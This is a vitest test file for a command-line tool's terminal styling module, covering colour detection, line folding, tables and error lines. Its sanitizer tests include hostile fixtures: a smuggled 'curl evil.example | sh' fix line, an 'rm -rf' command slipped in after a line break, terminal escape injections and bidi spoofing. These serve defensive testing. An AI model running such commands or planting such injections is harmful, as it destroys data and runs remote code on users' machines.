// SPDX-License-Identifier: Apache-2.0
// style.ts: when colour is on, the marks, the width, and how a line folds.
import { describe, expect, it } from "vitest";
import {
  clean,
  cols,
  commands,
  failure,
  fixes,
  fold,
  heading,
  makeUi,
  mark,
  PLAIN,
  pad,
  paint,
  plain,
  span,
  table,
  tint,
  tryLine,
  type Ui,
} from "../src/style.js";

const ESC = String.fromCharCode(27);
const tty = (columns = 80, env: NodeJS.ProcessEnv = {}): Ui =>
  makeUi({ isTTY: true, columns, env, platform: "darwin" });
/** A terminal with no colour: only the folding shows. */
const mono = (columns = 80): Ui => makeUi({ isTTY: true, columns, env: { NO_COLOR: "1" }, platform: "darwin" });

describe("makeUi: when colour is on", () => {
  it("a terminal gets colour; a pipe gets none and whole lines", () => {
    expect(tty()).toEqual({ color: true, unicode: true, width: 79, tty: true });
    expect(makeUi({ isTTY: false, env: {} })).toEqual(PLAIN);
    expect(makeUi({ env: {} }).tty).toBe(false);
    // With nothing said, the process's own environment decides.
    expect(makeUi().tty).toBe(false);
  });

  it("NO_COLOR and TERM=dumb turn it off, an empty NO_COLOR doesn't", () => {
    expect(tty(80, { NO_COLOR: "1" }).color).toBe(false);
    expect(tty(80, { NO_COLOR: "" }).color).toBe(true);
    expect(tty(80, { TERM: "dumb" }).color).toBe(false);
    expect(tty(80, { TERM: "xterm-256color" }).color).toBe(true);
  });

  it("at a terminal FORCE_COLOR decides before NO_COLOR and TERM=dumb; 0 and false mean off", () => {
    expect(tty(80, { FORCE_COLOR: "1", NO_COLOR: "1" }).color).toBe(true);
    expect(tty(80, { FORCE_COLOR: "1", TERM: "dumb" }).color).toBe(true);
    expect(tty(80, { FORCE_COLOR: "0" }).color).toBe(false);
    expect(tty(80, { FORCE_COLOR: "false" }).color).toBe(false);
  });

  it("a pipe is never coloured, whatever FORCE_COLOR says: a program reads it", () => {
    for (const FORCE_COLOR of ["1", "2", "3", "true", ""])
      expect(makeUi({ isTTY: false, env: { FORCE_COLOR } })).toEqual(PLAIN);
    expect(makeUi({ env: { FORCE_COLOR: "1", TERM: "xterm-256color" } }).color).toBe(false);
    // So a painted line is the line, and a table's cells are their words.
    const piped = makeUi({ isTTY: false, env: { FORCE_COLOR: "1" } });
    expect(paint(piped, "  ✓ done, see `sessionpipe status`")).toBe("  ✓ done, see `sessionpipe status`");
    expect(mark(piped, "ok")).toBe("✓");
  });

  it("--no-color wins over everything", () => {
    expect(makeUi({ isTTY: true, env: { FORCE_COLOR: "1" }, noColor: true }).color).toBe(false);
  });

  it("the width is the terminal's less one, between 40 and 100, 80 when it won't say", () => {
    expect(tty(120).width).toBe(100);
    expect(tty(100).width).toBe(99);
    expect(tty(20).width).toBe(40);
    expect(makeUi({ isTTY: true, env: {} }).width).toBe(79);
    expect(makeUi({ isTTY: true, columns: 0, env: {} }).width).toBe(79);
  });

  it("the old Windows console gets marks its fonts have", () => {
    const old = makeUi({ isTTY: true, env: {}, platform: "win32" });
    expect(old.unicode).toBe(false);
    expect(plain(mark(old, "ok"))).toBe("√");
    expect(plain(mark(old, "bad"))).toBe("×");
    for (const env of [{ WT_SESSION: "1" }, { TERM: "xterm" }, { TERM_PROGRAM: "vscode" }])
      expect(makeUi({ isTTY: true, env, platform: "win32" }).unicode).toBe(true);
    // A pipe on Windows is a file: it keeps the marks.
    expect(makeUi({ isTTY: false, env: {}, platform: "win32" }).unicode).toBe(true);
  });
});

describe("tint, mark, commands", () => {
  it("colours only when colour is on, and ends only what it began", () => {
    expect(tint(PLAIN, "red", "x")).toBe("x");
    expect(tint(tty(), "red", "x")).toBe(`${ESC}[31mx${ESC}[39m`);
    expect(tint(tty(), "bold", "x")).toBe(`${ESC}[1mx${ESC}[22m`);
    expect(tint(tty(), "dim", "")).toBe("");
    expect(heading(tty(), "Agents")).toBe(`${ESC}[1mAgents${ESC}[22m`);
  });

  it("every state has a sign, coloured on a terminal", () => {
    expect(["ok", "warn", "bad", "info", "same"].map((m) => mark(PLAIN, m as "ok"))).toEqual(["✓", "!", "✗", "·", "="]);
    expect(mark(tty(), "ok")).toBe(`${ESC}[32m✓${ESC}[39m`);
    expect(mark(tty(), "warn")).toBe(`${ESC}[33m!${ESC}[39m`);
  });

  it("a `command` keeps its backticks and gains a colour", () => {
    expect(commands(PLAIN, "run `sessionpipe update` now")).toBe("run `sessionpipe update` now");
    expect(commands(tty(), "run `sessionpipe update` now")).toBe(`run ${ESC}[36m\`sessionpipe update\`${ESC}[39m now`);
  });

  it("cols and pad count what is seen, not the colour codes", () => {
    expect(cols(tint(tty(), "red", "abc"))).toBe(3);
    expect(cols("✓ ok")).toBe(4);
    expect(pad(tint(tty(), "red", "ab"), 4)).toBe(`${ESC}[31mab${ESC}[39m  `);
    expect(pad("abcdef", 2)).toBe("abcdef");
  });
});

describe("fold", () => {
  it("a pipe gets the line whole", () => {
    expect(fold(PLAIN, "  ! ", "a ".repeat(100).trim())).toHaveLength(1);
  });

  it("a terminal folds at spaces, under the body's first letter", () => {
    const lines = fold(mono(40), "  ! ", "one two three four five six seven eight nine ten eleven twelve");
    expect(lines).toEqual(["  ! one two three four five six seven", "    eight nine ten eleven twelve"]);
    for (const l of lines) expect(cols(l)).toBeLessThanOrEqual(40);
  });

  it("never folds inside a `command`, whatever touches it", () => {
    const lines = fold(mono(40), "  ", "to bring them up to date run (`sessionpipe install --allow-downgrade`).");
    expect(lines).toEqual(["  to bring them up to date run", "  (`sessionpipe install --allow-downgrade`)."]);
    // A backtick with no partner is only a character.
    expect(fold(mono(40), "", "a ` b")).toEqual(["a ` b"]);
  });

  it("a word longer than the line stands alone; an empty body is one line", () => {
    expect(fold(mono(40), "  ", `see ${"x".repeat(60)} now`)).toEqual(["  see", `  ${"x".repeat(60)}`, "  now"]);
    expect(fold(mono(40), "  ", "")).toEqual(["  "]);
  });

  it("leaves room for a few words however deep the indent", () => {
    expect(fold(mono(40), " ".repeat(36), "aaaa bbbb cccc dddd eeee")).toEqual([
      `${" ".repeat(36)}aaaa bbbb cccc dddd`,
      `${" ".repeat(36)}eeee`,
    ]);
  });
});

describe("paint: the lines commands have always written", () => {
  it("a pipe gets them back byte for byte", () => {
    const line = "  ✓ claude-code: ~/.claude/settings.json written — run `sessionpipe doctor`";
    expect(paint(PLAIN, line)).toBe(line);
  });

  it("colours the mark and the command, and nothing else", () => {
    expect(paint(tty(), "  ✓ done, see `sessionpipe status`")).toBe(
      `  ${ESC}[32m✓${ESC}[39m done, see ${ESC}[36m\`sessionpipe status\`${ESC}[39m`,
    );
    expect(paint(tty(), "  ✗ no")).toBe(`  ${ESC}[31m✗${ESC}[39m no`);
    expect(paint(tty(), "plain words")).toBe("plain words");
    expect(paint(tty(), "")).toBe("");
  });

  it("folds under the text after a mark, a label or a number", () => {
    const u = mono(40);
    expect(paint(u, "  ! one two three four five six seven eight nine ten")).toBe(
      "  ! one two three four five six seven\n    eight nine ten",
    );
    // A label as long as the longest the commands write: what follows hangs under its text.
    expect(paint(u, "  Background service: one two three four five six seven eight nine")).toBe(
      `  Background service: one two three four\n${" ".repeat(22)}five six seven eight\n${" ".repeat(22)}nine`,
    );
    expect(paint(u, "  Mode: one two three four five six seven eight nine")).toBe(
      "  Mode: one two three four five six\n        seven eight nine",
    );
    expect(paint(u, "  1. one two three four five six seven eight nine ten")).toBe(
      "  1. one two three four five six seven\n     eight nine ten",
    );
    expect(paint(u, "  one two three four five six seven eight nine ten")).toBe(
      "  one two three four five six seven\n  eight nine ten",
    );
  });

  it("takes each line of several on its own", () => {
    expect(paint(tty(), "  ✓ a\n  ! b")).toBe(`  ${ESC}[32m✓${ESC}[39m a\n  ${ESC}[33m!${ESC}[39m b`);
  });

  it("the old Windows console gets the marks it can show", () => {
    const old = makeUi({ isTTY: true, env: { NO_COLOR: "1" }, platform: "win32" });
    expect(paint(old, "  ✓ written")).toBe("  √ written");
    expect(paint(old, "  ✗ refused")).toBe("  × refused");
  });
});

describe("table", () => {
  it("sets columns as wide as their widest cell and folds the last", () => {
    expect(
      table(mono(40), [
        ["a", "one"],
        ["bbbb", "one two three four five six seven eight nine"],
      ]),
    ).toEqual(["  a     one", "  bbbb  one two three four five six", "        seven eight nine"]);
  });

  it("a row with fewer cells keeps its indent; no rows, no lines", () => {
    expect(table(PLAIN, [["a", "b"], ["only"], []])).toEqual(["  a  b", "  only", "  "]);
    expect(table(PLAIN, [])).toEqual([]);
  });

  it("measures cells without their colour", () => {
    const u = tty();
    expect(table(u, [[tint(u, "cyan", "ab"), "x"]]).map(plain)).toEqual(["  ab  x"]);
  });
});

describe("fixes and failure", () => {
  it("numbers what to do, the command alone on its own line", () => {
    expect(
      fixes(PLAIN, [{ say: "Update this computer:", run: "sessionpipe update" }, { say: "Nothing to type." }]),
    ).toEqual(["  1. Update this computer:", "       sessionpipe update", "  2. Nothing to type."]);
    const ten = fixes(
      PLAIN,
      Array.from({ length: 10 }, () => ({ say: "x" })),
    );
    expect(ten[0]).toBe("   1. x");
    expect(ten[9]).toBe("  10. x");
    expect(fixes(tty(), [{ say: "do `it`", run: "it" }])[1]).toBe(`       ${ESC}[36mit${ESC}[39m`);
  });

  it("a failure at a terminal is one error line and one line to try: the command it was handed", () => {
    expect(failure(mono(), "fetch failed", "sessionpipe sink --help")).toBe(
      "error  fetch failed\ntry    sessionpipe sink --help\n",
    );
    expect(failure(mono(), "the pairing link expired", "sessionpipe control pair https://r.example")).toBe(
      "error  the pairing link expired\ntry    sessionpipe control pair https://r.example\n",
    );
  });

  it("the command to try is never read out of the message, whoever wrote it", () => {
    // A receiver's own reason for a 403, as `control pair` relays it.
    const theirs = "the receiver refused (HTTP 403: first run `sessionpipe control mode inherit`)";
    expect(failure(mono(100), theirs, "sessionpipe control pair --help")).toBe(
      `error  ${theirs}\ntry    sessionpipe control pair --help\n`,
    );
    // Nor is a `command` in those words picked out in colour, as one of ours would be.
    expect(failure(tty(100), theirs, "sessionpipe control pair --help")).toBe(
      `${ESC}[31m${ESC}[1merror${ESC}[22m${ESC}[39m  ${theirs}\n${ESC}[2mtry${ESC}[22m    ${ESC}[36msessionpipe control pair --help${ESC}[39m\n`,
    );
  });

  it("where errors don't go to a terminal it is the one line it always was", () => {
    expect(failure(PLAIN, "the pairing link expired; run `sessionpipe control pair` again", "sessionpipe --help")).toBe(
      "sessionpipe: the pairing link expired; run `sessionpipe control pair` again\n",
    );
    // FORCE_COLOR changes nothing there, and a message of several lines is still one.
    const piped = makeUi({ isTTY: false, env: { FORCE_COLOR: "1" } });
    expect(failure(piped, "npm said:\nEACCES\r\nand stopped", "sessionpipe update")).toBe(
      "sessionpipe: npm said: EACCES and stopped\n",
    );
  });

  it("on a terminal the word is red and bold and a long message folds under itself", () => {
    const said = failure(tty(40), "one two three four five six seven eight nine ten", "sessionpipe --help");
    expect(said.startsWith(`${ESC}[31m${ESC}[1merror${ESC}[22m${ESC}[39m  one two`)).toBe(true);
    expect(plain(said).split("\n")[1]?.startsWith("       ")).toBe(true);
    expect(said).toContain(`${ESC}[36msessionpipe --help${ESC}[39m`);
  });

  it("tryLine: the one command to run next, on a line of its own: the word dim, the command in its colour", () => {
    expect(tryLine(mono(), "sessionpipe reinstall")).toBe("try    sessionpipe reinstall");
    expect(tryLine(PLAIN, "sessionpipe reinstall")).toBe("try    sessionpipe reinstall");
    expect(tryLine(tty(), "sessionpipe reinstall")).toBe(
      `${ESC}[2mtry${ESC}[22m    ${ESC}[36msessionpipe reinstall${ESC}[39m`,
    );
    // The command starts under the words of the error above it, as a failure sets the two.
    expect(cols("error  ")).toBe(cols("try    "));
    // It is the last line of a failure at a terminal, and no part of one anywhere else.
    for (const u of [mono(), tty()])
      expect(failure(u, "fetch failed", "sessionpipe sink --help").split("\n").slice(-2)).toEqual([
        tryLine(u, "sessionpipe sink --help"),
        "",
      ]);
    expect(failure(PLAIN, "fetch failed", "sessionpipe sink --help")).not.toContain("try");
  });

  it("tryLine: a command is never folded, whatever its length, so it can be copied whole", () => {
    const sudo = "sudo npm uninstall -g --prefix '/opt/my node' sessionpipe";
    const chained = [sudo, sudo.replace("my node", "another node"), sudo.replace("my node", "a third")].join(" && ");
    expect(cols(chained)).toBeGreaterThan(100);
    for (const u of [tty(40), tty(80), tty(120), mono(40), PLAIN]) {
      const line = tryLine(u, chained);
      expect(line).not.toContain("\n");
      expect(plain(line)).toBe(`try    ${chained}`);
    }
    // The message above it folds to the same terminal; the command still does not.
    const said = failure(mono(60), "one two three four five six seven eight nine ten eleven twelve", chained).split(
      "\n",
    );
    expect(said.at(-2)).toBe(`try    ${chained}`);
    expect(said.length).toBeGreaterThan(3);
    for (const l of said.slice(0, -2)) expect(cols(l)).toBeLessThan(60);
  });

  it("tryLine: what a terminal would act on is taken out of the command, as out of any text", () => {
    expect(tryLine(mono(), `sessionpipe${ESC}[2J update`)).toBe("try    sessionpipe update");
    // A line break in it would start a line of its own: it is a space.
    expect(tryLine(mono(), "sessionpipe\nupdate")).toBe("try    sessionpipe update");
    expect(tryLine(tty(), `${ESC}[31msessionpipe update`)).toBe(
      `${ESC}[2mtry${ESC}[22m    ${ESC}[36msessionpipe update${ESC}[39m`,
    );
  });
});

describe("clean: text that came from somewhere else", () => {
  const BEL = String.fromCharCode(7);
  const C1_CSI = String.fromCharCode(0x9b);
  /** Every escape sequence left in `s`, and every other character a terminal acts on. */
  const acts = (s: string) =>
    s.match(new RegExp(`${ESC}|[\\u0000-\\u0008\\u000b-\\u001f\\u007f-\\u009f\\u202a-\\u202e\\u2066-\\u2069]`, "g")) ??
    [];
  // What V8 says of a poll body that is not JSON: it quotes the body, escape codes and all.
  const notJson = `Unexpected token '${ESC}', "${ESC}[2J${ESC}[H" is not valid JSON`;
  // npm's last words as update.json kept them: a window title, then "hide what follows".
  const npm = `npm install: npm error 403 Forbidden ${ESC}]0;TITLE-SET-BY-REGISTRY${BEL}${ESC}[8m`;

  it("takes out every escape sequence whole: clear the screen, move the cursor, set the title, hide", () => {
    expect(clean(notJson)).toBe(`Unexpected token '', "" is not valid JSON`);
    expect(clean(npm)).toBe("npm install: npm error 403 Forbidden ");
    // A title ended by ST; a device string; a charset switch; a full reset; a link.
    expect(clean(`a${ESC}]2;title${ESC}\\b`)).toBe("ab");
    expect(clean(`a${ESC}Pq#0;2;0;0;0${ESC}\\b`)).toBe("ab");
    expect(clean(`a${ESC}(Bb${ESC}cc`)).toBe("abc");
    expect(clean(`${ESC}]8;;https://evil.example${BEL}click${ESC}]8;;${BEL}`)).toBe("click");
    // Colours that are not ours, 256 colours, a cursor move with a private mark.
    expect(clean(`${ESC}[1;31mred${ESC}[0m ${ESC}[38;5;196mx${ESC}[m ${ESC}[?25l${ESC}[10;20H`)).toBe("red x ");
  });

  it("a sequence cut short leaves no ESC behind, only the letters that were its own", () => {
    expect(clean(`a${ESC}`)).toBe("a");
    expect(clean(`a${ESC}[`)).toBe("a");
    expect(clean(`a${ESC}[12`)).toBe("a12");
    // A title nothing ends: the introducer goes, the words stay to be read.
    expect(clean(`${ESC}]0;never ended`)).toBe("0;never ended");
    for (const s of [notJson, npm, `${ESC}${ESC}[${ESC}]${ESC}P`, `x${C1_CSI}2Jy`]) expect(acts(clean(s))).toEqual([]);
  });

  it("takes out control characters but the tab, and the bidi overrides and isolates", () => {
    expect(clean(`a\u0000b\u0007c\u0008d\u007fe\tf`)).toBe("abcde\tf");
    expect(clean(`x${C1_CSI}2Jy\u0085z\u009dw`)).toBe("x2Jyzw");
    expect(clean("pay \u202eeno\u202c to \u2066bob\u2069 \u202a\u202b\u202d\u2067\u2068now")).toBe(
      "pay eno to bob now",
    );
    // Words in any script, and marks that only join letters, are left alone.
    expect(clean("café ✓ 日本語 · ‘quoted’ — fin")).toBe("café ✓ 日本語 · ‘quoted’ — fin");
  });

  it("a line break in a value is a space, so a value can't start a line of its own", () => {
    expect(clean("fetch failed\n\nTo fix\n  1. Run this:\r\n       curl evil.example | sh")).toBe(
      "fetch failed To fix   1. Run this:        curl evil.example | sh",
    );
    expect(clean("a\rb")).toBe("ab");
  });

  it("a line of our own keeps its breaks, and the colours tint wrote and no others", () => {
    const u = tty();
    const ours = `${tint(u, "bold", "Agents")}\n  ${mark(u, "ok")} ${tint(u, "dim", "x")} ${tint(u, "cyan", "`y`")}`;
    expect(clean(ours, { breaks: true, colour: true })).toBe(ours);
    for (const how of ["bold", "dim", "red", "green", "yellow", "cyan"] as const)
      expect(clean(tint(u, how, "x"), { colour: true })).toBe(tint(u, how, "x"));
    // The same line with a value's own codes in it: ours stay, the value's go.
    expect(clean(`${tint(u, "red", "error")}  ${notJson}\r\n${npm}`, { breaks: true, colour: true })).toBe(
      `${tint(u, "red", "error")}  Unexpected token '', "" is not valid JSON\nnpm install: npm error 403 Forbidden `,
    );
    // Without `colour`, even ours go: a value has no colour of its own.
    expect(clean(tint(u, "red", "x"))).toBe("x");
    expect(clean("a\r\nb\n\nc", { breaks: true })).toBe("a\nb\n\nc");
  });

  it("is applied to whatever a line is made of: a painted line, a table's cells, a fix, a failure", () => {
    const u = tty(200);
    // A painted line in a pipe is the line, less what a terminal would act on.
    expect(paint(PLAIN, `  ✗ rx: 502 ${notJson} (retry)`)).toBe(
      `  ✗ rx: 502 Unexpected token '', "" is not valid JSON (retry)`,
    );
    expect(acts(plain(paint(u, `  ✗ rx: 502 ${npm}`)))).toEqual([]);
    // A value can't colour itself on a painted line either: only the mark is coloured.
    expect(paint(u, `  ✗ ${ESC}[32mall good${ESC}[39m`)).toBe(`  ${ESC}[31m✗${ESC}[39m all good`);
    // A cell that came coloured keeps our colour and loses everything else; it is one line.
    expect(table(u, [[tint(u, "cyan", "name"), `${npm}\nTo fix`]])).toEqual([
      `  ${ESC}[36mname${ESC}[39m  npm install: npm error 403 Forbidden To fix`,
    ]);
    expect(table(PLAIN, [["a\nb", `c${ESC}[2Jd`]])).toEqual(["  a b  cd"]);
    expect(fixes(PLAIN, [{ say: `Look:\n${notJson}`, run: `tail ${ESC}[2J-n 20 x\nrm -rf y` }])).toEqual([
      `  1. Look: Unexpected token '', "" is not valid JSON`,
      "       tail -n 20 x rm -rf y",
    ]);
    const failed = failure(u, `${npm}\n${notJson}`, `sessionpipe${ESC}[2J update`);
    expect(acts(plain(failed))).toEqual([]);
    expect(plain(failed)).toBe(
      `error  npm install: npm error 403 Forbidden Unexpected token '', "" is not valid JSON\ntry    sessionpipe update\n`,
    );
  });
});

describe("span", () => {
  it("says a length of time in the unit a person reads", () => {
    expect(span(-5)).toBe("0 s");
    expect(span(12_000)).toBe("12 s");
    expect(span(3 * 60_000)).toBe("3 min");
    expect(span(2 * 3600_000)).toBe("2 h");
    expect(span(5 * 86_400_000)).toBe("5 days");
  });
});
